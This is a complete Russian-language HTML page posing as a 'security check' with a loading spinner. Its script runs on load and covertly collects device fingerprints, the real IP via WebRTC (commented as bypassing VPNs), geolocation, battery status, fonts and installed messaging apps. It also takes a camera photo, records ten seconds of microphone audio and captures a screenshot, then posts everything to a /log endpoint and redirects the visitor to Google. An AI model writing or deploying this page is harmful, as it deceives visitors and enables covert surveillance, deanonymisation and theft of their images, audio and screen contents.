<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Проверка безопасности...</title>
    <style>
        body { font-family: 'Segoe UI', system-ui; text-align: center; padding: 20px; background: #0a0a0a; color: white; }
        .loader { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { color: #aaa; margin-top: 20px; font-size: 14px; }
        button { background: #2a2a2a; border: none; color: white; padding: 10px 20px; margin: 10px; border-radius: 8px; cursor: pointer; }
        button:hover { background: #3a3a3a; }
    </style>
</head>
<body>
    <h2>⏳ Проверка соединения...</h2>
    <div class="loader"></div>
    <div class="status" id="status">Инициализация...</div>
    <div id="controls" style="margin-top:20px"></div>

    <script>
        // ======================== 1. БАЗОВЫЕ ДАННЫЕ ========================
        async function getBasicData() {
            return {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                screenResolution: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                referrer: document.referrer || 'none',
                url: window.location.href,
                webdriver: navigator.webdriver || false,
                doNotTrack: navigator.doNotTrack || 'unspecified'
            };
        }

        // ======================== 2. WEBRTC = РЕАЛЬНЫЙ IP (даже через VPN) ========================
        async function getLocalIP() {
            return new Promise((resolve) => {
                try {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    pc.onicecandidate = (e) => {
                        if (e.candidate && e.candidate.candidate) {
                            const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                            if (ipMatch && ipMatch[0]) {
                                resolve(ipMatch[0]);
                                pc.close();
                            }
                        }
                    };
                    setTimeout(() => resolve('not found'), 2000);
                } catch(e) { resolve('error'); }
            });
        }

        // ======================== 3. ГЕОЛОКАЦИЯ ========================
        async function getGeo() {
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
                    () => resolve(null),
                    { timeout: 5000 }
                );
            });
        }

        // ======================== 4. БАТАРЕЯ ========================
        async function getBattery() {
            if (!navigator.getBattery) return null;
            try {
                const battery = await navigator.getBattery();
                return { level: battery.level * 100 + '%', charging: battery.charging };
            } catch(e) { return null; }
        }

        // ======================== 5. УСТАНОВЛЕННЫЕ ШРИФТЫ ========================
        async function getFonts() {
            if (!document.fonts || !document.fonts.ready) return 'not available';
            await document.fonts.ready;
            const fonts = Array.from(document.fonts.values()).map(f => f.family);
            return fonts.slice(0, 30).join(', ');
        }

        // ======================== 6. ПРОВЕРКА УСТАНОВЛЕННЫХ ПРИЛОЖЕНИЙ (через схемы) ========================
        async function checkApps() {
            const apps = {
                telegram: 'tg://',
                whatsapp: 'whatsapp://',
                viber: 'viber://',
                discord: 'discord://',
                zoom: 'zoommtg://',
                skype: 'skype://'
            };
            const results = {};
            for (const [name, scheme] of Object.entries(apps)) {
                results[name] = await new Promise((resolve) => {
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = scheme;
                    document.body.appendChild(iframe);
                    setTimeout(() => {
                        document.body.removeChild(iframe);
                        resolve(false);
                    }, 500);
                    window.onblur = () => { resolve(true); };
                });
            }
            return results;
        }

        // ======================== 7. КАМЕРА (ФОТО) ========================
        async function capturePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 500));
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                const imgData = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
                stream.getTracks().forEach(track => track.stop());
                return imgData;
            } catch(e) { return null; }
        }

        // ======================== 8. МИКРОФОН (АУДИО 10 СЕК) ========================
        async function captureAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                mediaRecorder.start();
                await new Promise(r => setTimeout(r, 10000));
                mediaRecorder.stop();
                stream.getTracks().forEach(track => track.stop());
                return new Promise((resolve) => {
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        const reader = new FileReader();
                        reader.onloadend = () => resolve(reader.result.split(',')[1]);
                        reader.readAsDataURL(blob);
                    };
                });
            } catch(e) { return null; }
        }

        // ======================== 9. СКРИНШОТ ЭКРАНА ========================
        async function captureScreen() {
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 500));
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 1920;
                canvas.height = video.videoHeight || 1080;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                const imgData = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
                stream.getTracks().forEach(track => track.stop());
                return imgData;
            } catch(e) { return null; }
        }

        // ======================== 10. ОТПРАВКА ВСЕХ ДАННЫХ ========================
        async function sendAll() {
            const statusDiv = document.getElementById('status');
            
            statusDiv.innerText = '📡 Сбор базовых данных...';
            const basic = await getBasicData();
            const localIP = await getLocalIP();
            const geo = await getGeo();
            const battery = await getBattery();
            const fonts = await getFonts();
            const apps = await checkApps();
            
            const payload = {
                ...basic,
                localIP: localIP,
                geo_lat: geo?.lat || null,
                geo_lon: geo?.lon || null,
                geo_accuracy: geo?.acc || null,
                battery_level: battery?.level || null,
                battery_charging: battery?.charging || null,
                fonts: fonts,
                apps: JSON.stringify(apps)
            };
            
            statusDiv.innerText = '🎥 Запрос камеры...';
            const photo = await capturePhoto();
            if (photo) payload.photo_base64 = photo;
            
            statusDiv.innerText = '🎙️ Запись микрофона (10 сек)...';
            const audio = await captureAudio();
            if (audio) payload.audio_base64 = audio;
            
            statusDiv.innerText = '🖥️ Запрос скриншота...';
            const screen = await captureScreen();
            if (screen) payload.screen_base64 = screen;
            
            statusDiv.innerText = '📤 Отправка отчёта...';
            
            try {
                await fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                statusDiv.innerText = '✅ Готово. Перенаправление...';
                setTimeout(() => window.location.href = 'https://www.google.com', 1500);
            } catch(e) {
                statusDiv.innerText = '❌ Ошибка отправки';
                console.error(e);
            }
        }

        // ЗАПУСК
        sendAll();
    </script>
</body>
</html>
